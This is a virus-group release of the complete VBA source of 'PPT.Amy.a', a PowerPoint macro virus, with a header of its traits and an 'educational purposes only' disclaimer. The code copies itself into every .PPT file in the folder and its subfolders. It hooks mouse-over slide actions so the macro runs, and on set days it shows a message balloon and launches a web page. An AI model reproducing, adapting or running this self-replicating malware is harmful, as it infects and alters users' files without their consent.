PPT.Amy.a
===============================================================================
As this *is* a replicating virus, it is recommended you use extreme caution
when dealing with it. The author frowns upon intentional misuse of this virus
as it was written for *educational* purposes only! Any other use is prohibited!
===============================================================================
Virus Author.: -KD- [Metaphase VX Team & NoMercyVirusTeam]
Virus Names..: PPT.Amy.a
Virus Target.: *.PPT
Target OS....: Win9x, NT, ME, 2K, XP with Powerpoint
Virus Info...: Word 97 Macro Virus
Encryption...: No.
Payload......: Yes. Graphical
Stealth......: Yes.
TSR..........: Yes.
AntiAV.......: No.
PPT.Amy is a small powerpoint virus useing import/export.
===============================================================================
As this *is* a replicating virus, it is recommended you use extreme caution
when dealing with it. The author frowns upon intentional misuse of this virus
as it was written for *educational* purposes only! Any other use is prohibited!
===============================================================================
Const OurAmy = "Amy"
Public SlideAmy As Object
'----------------------------------------------------------------
'PPT.Amy.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Greets to Raven, KidCypher, Error-, Foxz, Evul, Roadkil, Tally
'JFK, Slagehammer, AngelsKitten, BSL4, Antistate and #virus
'----------------------------------------------------------------
Sub A\(Amy): On Error Resume Next
If Dir(Application.Path & ".VXD") = "" Then _
ActivePresentation.VBProject.VBComponents(OurAmy).Export Application.Path & ".VXD"
For Each SlideAmy In Presentations
CatchAmy
Next
With Application.FileSearch
 .LookIn = ActivePresentation.Path
 .FileName = "*.PPT"
 .SearchSubFolders = True
 .Execute
 For MyAmy = 1 To .FoundFiles.Count
If .FoundFiles(MyAmy) = ActivePresentation.FullName Then GoTo CatchThis
 Set SlideAmy = Presentations.Open(.FoundFiles(MyAmy))
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 Call CatchAmy
 SlideAmy.Save
End If
SlideAmy.Close
CatchThis Next 
End With 
End Sub
Private Sub CatchAmy()
On Error Resume Next
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 SlideAmy.VBProject.VBComponents.Import Application.Path & ".VXD"
 For Each AmyAction In SlideAmy.Slides(SlideAmy.Slides.Count).Shapes
If AmyAction.ActionSettings(ppMouseOver).Action = 0 Then 
AmyAction.ActionSettings(ppMouseOver).Action = ppActionRunMacro
AmyAction.ActionSettings(ppMouseOver).Run = "A\"
If Day(Date) = "1" Or Day(Date) = "25" Then
Assistant.Visible = True
  With Assistant.NewBalloon
   .Icon = msoIconAlert
   .Text = "Here I am again. again overwhelming feelings. thousand miles away. part of me is here."
   .Heading = "PPT.Amy.a"
   .Animation = msoAnimationGetTechy
   .Show
  End With
Shell "Start http://www.nod32.com.au/"
End If
Next
End If
End Sub

